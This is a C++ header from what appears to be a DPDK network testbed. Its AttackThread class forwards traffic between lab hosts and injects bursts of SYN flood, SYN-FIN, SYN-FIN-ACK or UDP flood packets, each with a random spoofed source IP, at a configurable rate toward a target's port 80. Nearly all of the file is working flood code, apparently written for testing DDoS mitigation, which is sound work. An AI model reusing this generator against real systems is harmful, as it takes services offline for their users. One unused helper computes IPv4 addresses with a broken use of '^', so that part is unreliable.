#pragma once

#include <rte_ether.h>

#include "PacketDissection/PacketContainerLean.hpp"
#include "PacketDissection/PacketInfo.hpp"
#include "PacketDissection/PacketInfoIpv4Tcp.hpp"
#include "RandomNumberGenerator.hpp"
#include "Threads/ForwardingThread.hpp"

class AttackThread : public Thread {
  private:
    inline void run() {
        std::cout << "\nRunning on lcore " << rte_lcore_id()
                  << ". [Ctrl+C to quit]\n"
                  << std::endl;

        while (likely(_quit == false)) {
            // have skip iterate field in config and skip for nb of packets
            iterate();
#ifdef SINGLE_ITERATION
            _quit = false;
#endif
        }

        _running = false;
    }

    PacketContainerLean* _pkt_container_to_dave;
    PacketContainerLean* _pkt_container_to_alice;
    RandomNumberGenerator _rng;
    unsigned int _nb_worker_threads;

    rte_ether_addr _bob_mac;
    rte_ether_addr _src_mac;

    uint32_t _bob_ip;
    uint32_t _alice_ip;

    uint8_t _tcp_flags;

    enum AttackType { SYN_FLOOD, SYN_FIN_ACK, SYN_FIN, UDP_FLOOD, NO_ATTACK };
    AttackType _attack_type;

    rte_mbuf* _mbuf_origin;

    uint64_t _cycles_old;
    uint64_t _data_rate;
    uint64_t _nb_attack_packets;
    uint64_t _data_rate_per_cycle;
    uint64_t _delta_cycles_mean;

    uint64_t _total_nb_pkts_to_dave;
    uint64_t _total_nb_pkts_from_dave;
    uint64_t _total_nb_pkts_to_alice;
    uint64_t _total_data_volume_to_alice;
    uint64_t _total_nb_pkts_from_alice;
    uint64_t _total_data_volume_from_alice;

    int _iterations;
    uint _call_send_pkts_every_nth_iteration;

    // ============ not needed

    uint16_t _nb_pkts_to_dave;
    uint16_t _nb_pkts_to_alice;

    PacketType _pkt_type;

    uint64_t _cycles;
    uint64_t _delta_cycles;
    uint64_t _data_volume;

    uint64_t _hz;
    int _n;

    /**
     * This method is used in a loop so every parameter is created before
     * the loop. These you pass to the function which initializes the
     * variables.
     *
     * @param[in] pkt_size
     * @param[in] cycles
     * @param[in] delta_cycles
     * @param[in] cycles_old
     * @param[in] data_volume
     * @param[in] data_rate_per_cycle
     * @param[out] nb_attack_packets
     */
    inline void calculate_nb_attack_packets(int pkt_size) {

        _cycles = rte_get_tsc_cycles();
        _delta_cycles = _cycles - _cycles_old;

        // data volume to send in bit
        _data_volume = _delta_cycles * _data_rate_per_cycle;

        _nb_attack_packets = int(_data_volume / (pkt_size * 8));

        if (unlikely(_nb_attack_packets == 0)) {
            _nb_attack_packets = 2;
        }

        if (unlikely(_nb_attack_packets >= NUM_MBUF_ARRS * BURST_SIZE - 1)) {
            _nb_attack_packets = NUM_MBUF_ARRS * BURST_SIZE - 1;
            LOG_INFO << "maximum reached" << LOG_END;
        }

        LOG_INFO << "Number of cycles: " << _delta_cycles << LOG_END;

        LOG_INFO << "Duration of a period: " << (_delta_cycles / _hz)
                 << LOG_END;

        // set _cycles_old
        _cycles_old = _cycles;
    }

    /**
     * @brief
     *
     * @param byte1
     * @param byte2
     * @param byte3
     * @param byte4
     * @return uint32_t
     */
    inline uint32_t calculate_ipv4_address(uint8_t byte1, uint8_t byte2,
                                           uint8_t byte3, uint8_t byte4) {
        return byte1 * 2 ^ 24 + byte2 * 2 ^ 16 + byte3 * 2 ^ 8 + byte4;
    }

    /**
     * @brief Create a bulk of attack packets, add them to the packets
     * already in the PacketContainer.
     */
    inline void create_attack_packet_burst_tcp(uint32_t nb_pkts,
                                               uint8_t tcp_flags) {

        rte_mempool* mempool = _pkt_container_to_dave->get_mempool_lean();

        rte_mbuf* m_copy;

        for (int i = 0; i < nb_pkts; ++i) {
            m_copy = rte_pktmbuf_copy(_mbuf_origin, mempool, 0, UINT32_MAX);

            if (unlikely(m_copy == nullptr)) {
                throw std::runtime_error("m_copy is null");
            }

            PacketInfoIpv4Tcp* pkt_info = static_cast<PacketInfoIpv4Tcp*>(
                PacketInfoCreator::create_mini_pkt_info(m_copy, IPv4TCP));

            pkt_info->set_src_ip(_rng.gen_rdm_32_bit());

            // select one of the following two, which one suits you better
            // pkt_info->recalculate_checksums();
            pkt_info->prepare_offloading_checksums();

            _pkt_container_to_dave->add_mbuf(m_copy);

            delete pkt_info;
            pkt_info = nullptr;
        }
    }

    /**
     * @brief Create a bulk of attack packets, add them to the packets
     * already in the PacketContainer.
     */
    inline void create_attack_packet_burst_udp(uint32_t nb_pkts) {

        rte_mempool* mempool = _pkt_container_to_dave->get_mempool_lean();

        rte_mbuf* m_copy;

        for (int i = 0; i < nb_pkts; ++i) {
            m_copy = rte_pktmbuf_copy(_mbuf_origin, mempool, 0, UINT32_MAX);

            if (unlikely(m_copy == nullptr)) {
                throw std::runtime_error("m_copy is null");
            }

            PacketInfoIpv4Udp* pkt_info = static_cast<PacketInfoIpv4Udp*>(
                PacketInfoCreator::create_mini_pkt_info(m_copy, IPv4UDP));

            pkt_info->set_src_ip(_rng.gen_rdm_32_bit());

            // select one of the following two, which one suits you better
            // pkt_info->recalculate_checksums();
            pkt_info->prepare_offloading_checksums(false);

            _pkt_container_to_dave->add_mbuf(m_copy);

            delete pkt_info;
            pkt_info = nullptr;
        }
    }

    inline void calculate_cycles() {
        _cycles = rte_get_tsc_cycles();
        _delta_cycles = _cycles - _cycles_old;

        if (_n == 1) {
            _delta_cycles_mean = _delta_cycles;
        }

        _delta_cycles_mean =
            (_delta_cycles_mean + _delta_cycles / _n) * _n / (_n + 1);
        ++_n;

        LOG_INFO << "delta_cycles_mean: " << _delta_cycles_mean << LOG_END;

        // LOG_INFO << "Duration of a period: " << (_delta_cycles / _hz) <<
        // LOG_END;

        _cycles_old = _cycles;
    }

  public:
    bool _do_attack;

    inline AttackThread(PacketContainerLean* pkt_container_to_dave,
                        PacketContainerLean* pkt_container_to_alice,
                        unsigned int nb_worker_threads)

        : Thread(), _nb_worker_threads(nb_worker_threads), _iterations(0),
          _call_send_pkts_every_nth_iteration(0),
          _pkt_container_to_dave(pkt_container_to_dave),
          _pkt_container_to_alice(pkt_container_to_alice), _nb_pkts_to_dave(0),
          _nb_pkts_to_alice(0), _total_nb_pkts_to_dave(0), 
          _total_nb_pkts_from_dave(0), _total_nb_pkts_to_alice(0), 
          _total_data_volume_to_alice(0), _total_nb_pkts_from_alice(0), 
          _total_data_volume_from_alice(0), _pkt_type(NONE), _cycles(0), 
          _delta_cycles(0), _data_volume(0), _nb_attack_packets(0), 
          _hz(rte_get_tsc_hz()), _delta_cycles_mean(0), _n(1), 
          _bob_mac({.addr_bytes = {60, 253, 254, 163, 231, 48}}),
          _src_mac({.addr_bytes = {60, 253, 254, 163, 231, 88}}),
          _bob_ip(167772162), _alice_ip(167772161), _tcp_flags(0),
          _mbuf_origin(nullptr), _do_attack(false) {

        // ===== calculate stuff regarding clock calculation ===== //

        /*
        _data_rate =
            int((std::stoi(Configurator::instance()->get_config_as_string(
                     "attack_rate")) *
                 1000000) /
                _nb_worker_threads);

        _data_rate_per_cycle = int(_data_rate / _hz);

        // if data_rate < hz
        if (_data_rate_per_cycle == 0) {
            _data_rate_per_cycle = _data_rate;
        }

        _cycles_old = rte_get_tsc_cycles();
        */

        // ===== read and set attack type ===== //

        std::string attack_type =
            Configurator::instance()->get_config_as_string("attack_type");

        if (attack_type == "none") {
            _attack_type = NO_ATTACK;
        } else if (attack_type == "syn_flood") {
            _attack_type = SYN_FLOOD;
            _tcp_flags = 0b00000010;
        } else if (attack_type == "syn_fin") {
            _attack_type = SYN_FIN;
            _tcp_flags = 0b00000011;
        } else if (attack_type == "syn_fin_ack") {
            _attack_type = SYN_FIN_ACK;
            _tcp_flags = 0b00010011;
        } else if (attack_type == "udp_flood") {
            _attack_type = UDP_FLOOD;
        } else {
            throw std::runtime_error(
                "String attack_type in config_attacker.json "
                "does not match any type");
        }

        LOG_INFO << "Attack type " << attack_type << " is set." << LOG_END;

        // ===== set number of attack packets ===== //

        _nb_attack_packets =
            Configurator::instance()->get_config_as_unsigned_int(
                "number_of_attack_packets_per_thread_per_send_call");

        _call_send_pkts_every_nth_iteration =
            Configurator::instance()->get_config_as_unsigned_int(
                "call_send_pkts_every_nth_iteration");

        LOG_INFO << "number_of_attack_packets_per_thread_per_send_call : "
                 << _nb_attack_packets << LOG_END;

        // ===== create origin attack packet ===== //

        _mbuf_origin =
            rte_pktmbuf_alloc(_pkt_container_to_dave->get_mempool_lean());

        if (_attack_type == SYN_FLOOD || _attack_type == SYN_FIN ||
            _attack_type == SYN_FIN_ACK) {

            PacketInfo* pkt_info_plain =
                PacketInfoCreator::create_pkt_info(_mbuf_origin, IPv4TCP);

            PacketInfoIpv4Tcp* pkt_info_origin =
                static_cast<PacketInfoIpv4Tcp*>(pkt_info_plain);

            pkt_info_origin->fill_payloadless_tcp_packet(
                _src_mac, _bob_mac, _rng.gen_rdm_32_bit(), _bob_ip,
                _rng.gen_rdm_16_bit(), 80, 1, 1, _tcp_flags, 64);

            pkt_info_origin->prepare_offloading_checksums();

            delete pkt_info_origin;
            pkt_info_origin = nullptr;

        } else if (_attack_type == UDP_FLOOD) {

            PacketInfo* pkt_info_plain =
                PacketInfoCreator::create_pkt_info(_mbuf_origin, IPv4UDP);

            PacketInfoIpv4Udp* pkt_info_origin =
                static_cast<PacketInfoIpv4Udp*>(pkt_info_plain);

            pkt_info_origin->fill_payloadless_udp_packet(
                _src_mac, _bob_mac, _rng.gen_rdm_32_bit(), _bob_ip,
                _rng.gen_rdm_16_bit(), 80);

            pkt_info_origin->prepare_offloading_checksums(false);

            delete pkt_info_origin;
            pkt_info_origin = nullptr;
        }

        // ===== attack rate
    }

    inline ~AttackThread() { rte_pktmbuf_free(_mbuf_origin); }

    inline static int s_run(void* thread_vptr) {
        AttackThread* thread = static_cast<AttackThread*>(thread_vptr);
        thread->run();

        return 0;
    }

    inline void iterate() {

        // ===== ALICE <--[MALLORY]-- DAVE/BOB ===== //

        _pkt_container_to_alice->poll_mbufs(_nb_pkts_to_alice);
        _total_nb_pkts_from_dave += _nb_pkts_to_alice;

        // continue if no packets are received
        if (likely(_nb_pkts_to_alice > 0)) {
            // drop all packets that do not go to the mallory interface
            for (int i = 0; i < _nb_pkts_to_alice; i++) {

                rte_mbuf* mbuf = _pkt_container_to_alice->get_mbuf_at_index(i);

                uint32_t ip4_addr =
                    PacketInfoCreator::get_dst_ip_from_mbuf(mbuf);

                if (likely(ip4_addr != 0 && ip4_addr != _alice_ip)) {
                    _pkt_container_to_alice->drop_polled_mbuf(i);
                } else {
                    _total_data_volume_to_alice += rte_pktmbuf_pkt_len(mbuf);
                }
            }
            _total_nb_pkts_to_alice += _pkt_container_to_alice->send_mbufs();
        }

        // ===== ALICE --[MALLORY]--> DAVE/BOB ===== //

        _pkt_container_to_dave->poll_mbufs(_nb_pkts_to_dave);
        _total_nb_pkts_from_alice += _nb_pkts_to_dave;
        for (int i = 0; i < _nb_pkts_to_dave; ++i) {
            _total_data_volume_from_alice += rte_pktmbuf_pkt_len(
                _pkt_container_to_dave->get_mbuf_at_index(i));
        }

        if (unlikely(_iterations == _call_send_pkts_every_nth_iteration)) {
            _iterations = 0;

            // create attack packets
            if (likely(_do_attack)) {
                if (_attack_type == SYN_FLOOD || _attack_type == SYN_FIN ||
                    _attack_type == SYN_FIN_ACK) {
                    create_attack_packet_burst_tcp(_nb_attack_packets,
                                                   _tcp_flags);
                } else if (_attack_type == UDP_FLOOD) {
                    create_attack_packet_burst_udp(_nb_attack_packets);
                }
            } else{
                _total_nb_pkts_to_dave = 0;
                _total_nb_pkts_from_dave = 0;
                _total_nb_pkts_to_alice = 0;
                _total_data_volume_to_alice = 0;
                _total_nb_pkts_from_alice = 0;
                _total_data_volume_from_alice = 0;
            }
        }

        ++_iterations;

        _total_nb_pkts_to_dave = _total_nb_pkts_to_dave +
                             _pkt_container_to_dave->send_mbufs();

        // calculate_cycles();
    }

    inline uint64_t get_total_nb_pkts_to_dave() { 
        return _total_nb_pkts_to_dave; 
    }

    inline uint64_t get_total_nb_pkts_from_dave() {
        return _total_nb_pkts_from_dave;
    }

    inline uint64_t get_total_nb_pkts_to_alice() {
        return _total_nb_pkts_to_alice;
    }

    inline uint64_t get_total_data_volume_to_alice() {
        return _total_data_volume_to_alice;
    }

    inline uint64_t get_total_nb_pkts_from_alice() {
        return _total_nb_pkts_from_alice;
    }

    inline uint64_t get_total_data_volume_from_alice() {
        return _total_data_volume_from_alice;
    }

    inline int get_atk_pkt_type() {
        if ((_attack_type == SYN_FLOOD) || (_attack_type == SYN_FIN) ||
            (_attack_type == SYN_FIN_ACK)) {

            return 1;
        }
        return 0;
    }
};